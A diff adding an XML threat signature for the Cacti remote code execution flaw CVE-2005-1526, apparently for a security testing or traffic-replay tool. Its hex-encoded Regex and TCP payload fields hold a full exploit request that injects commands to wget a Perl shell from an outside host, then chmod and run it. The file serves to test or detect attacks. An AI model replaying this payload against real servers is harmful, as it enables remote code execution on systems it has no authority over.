@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cacti Remote Code Execution Attack"/>
+    <EngDesc display="true" value="This threat inserts a block of PHP code that will get executed through a flaw in the Cacti web application.  This application typically resides on a webserver and listens on port 80."/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cacti"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Cacti_Cacti"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Cacti_Cacti_0.8.6d"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.idefense.com/application/poi/display?id=266&amp;type=vulnerabilities"/>
+    <CVEID display="true" value="CVE-2005-1526"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="8dc60187b589b2bbb2ad06c2ae5e957a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725869362500000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="F"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X63\X61\X63\X74\X69\X2F\X67\X72\X61\X70\X68\X5F\X69\X6D\X61\X67\X65\X2E\X70\X68\X70\X3F\X6C\X6F\X63\X61\X6C\X5F\X67\X72\X61\X70\X68\X5F\X69\X64\X3D\X31\X26\X67\X72\X61\X70\X68\X5F\X73\X74\X61\X72\X74\X3D\X25\X30\X61\X63\X64\X25\X32\X30\X2F\X74\X6D\X70\X3B\X77\X67\X65\X74\X25\X32\X30\X68\X74\X74\X70\X3A\X2F\X2F\X61\X6C\X62\X79\X74\X68\X65\X62\X65\X73\X74\X2E\X61\X6C\X74\X65\X72\X76\X69\X73\X74\X61\X2E\X6F\X72\X67\X2F\X73\X68\X65\X6C\X6C\X2E\X70\X6C\X3B\X63\X68\X6D\X6F\X64\X25\X32\X30\X37\X37\X37\X25\X32\X30\X73\X68\X65\X6C\X6C\X2E\X70\X6C\X3B\X70\X65\X72\X6C\X25\X32\X30\X73\X68\X65\X6C\X6C\X2E\X70\X6C\X25\X30\X61\X20\X48\X54\X54\X50\X2F\X31\X2E\X31\X0D\X0A\X54\X45\X3A\X20\X64\X65\X66\X6C\X61\X74\X65\X2C\X67\X7A\X69\X70\X3B\X71\X3D\X30\X2E\X33\X0D\X0A\X43\X6F\X6E\X6E\X65\X63\X74\X69\X6F\X6E\X3A\X20\X54\X45\X2C\X20\X63\X6C\X6F\X73\X65\X0D\X0A\X48\X6F\X73\X74\X3A\X20\X6C\X6F\X63\X61\X6C\X68\X6F\X73\X74\X0D\X0A\X55\X73\X65\X72\X2D\X41\X67\X65\X6E\X74\X3A\X20\X4C\X57\X50\X3A\X3A\X53\X69\X6D\X70\X6C\X65\X2F\X35\X2E\X36\X35\X0D\X0A\X0D\X0A"/>
+    <Created value="1155320317" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F63616374692F67726170685F696D6167652E7068703F6C6F63616C5F67726170685F69643D312667726170685F73746172743D25306163642532302F746D703B77676574253230687474703A2F2F616C6279746865626573742E616C74657276697374612E6F72672F7368656C6C2E706C3B63686D6F642532303737372532307368656C6C2E706C3B7065726C2532307368656C6C2E706C25306120485454502F312E310D0A54453A206465666C6174652C677A69703B713D302E330D0A436F6E6E656374696F6E3A2054452C20636C6F73650D0A486F73743A206C6F63616C686F73740D0A557365722D4167656E743A204C57503A3A53696D706C652F352E36350D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
